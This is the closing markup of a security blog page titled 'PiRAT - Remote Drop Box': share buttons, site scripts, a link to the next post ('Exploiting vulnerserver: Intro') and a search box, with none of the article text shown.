    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://reddit.com/submit/?url=https://dunderhay.github.io/posts/physec/remotebox/&amp;resubmit=true&amp;title=PiRAT%20-%20Remote%20Drop%20Box"
      title="Submit to Reddit"
      aria-label="Submit to Reddit"
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://api.whatsapp.com/send?text=https://dunderhay.github.io/posts/physec/remotebox/&amp;resubmit=true&amp;title=PiRAT%20-%20Remote%20Drop%20Box"
      title=""
      aria-label=""
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://t.me/share/url?url=https://dunderhay.github.io/posts/physec/remotebox/&amp;resubmit=true&amp;title=PiRAT%20-%20Remote%20Drop%20Box"
      title=""
      aria-label=""
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://pinterest.com/pin/create/bookmarklet/?url=https://dunderhay.github.io/posts/physec/remotebox/&amp;description=PiRAT%20-%20Remote%20Drop%20Box"
      title="Pin on Pinterest"
      aria-label="Pin on Pinterest"
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="https://www.facebook.com/sharer/sharer.php?u=https://dunderhay.github.io/posts/physec/remotebox/&amp;quote=PiRAT%20-%20Remote%20Drop%20Box"
      title="Share on Facebook"
      aria-label="Share on Facebook"
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>

  </span>


    </a>
      
    
      
      <a
      target="_blank"
      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
      href="mailto:?body=https://dunderhay.github.io/posts/physec/remotebox/&amp;subject=PiRAT%20-%20Remote%20Drop%20Box"
      title="Send via email"
      aria-label="Send via email"
      >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>

  </span>


    </a>
      
    
  </section>


          
      </div>
     
     <script>
        var oid = "views_posts\/physec\/remotebox.md"
        var oid_likes = "likes_posts\/physec\/remotebox.md"
      </script>
      
      
      <script type="text/javascript" src="https://dunderhay.github.io/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="https://dunderhay.github.io/posts/vulnserver/intro/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Exploiting vulnserver: Intro</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=""
            title=""></a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    

    
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="https://dunderhay.github.io/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ=="></script>
  
  
</footer><div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="https://dunderhay.github.io/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
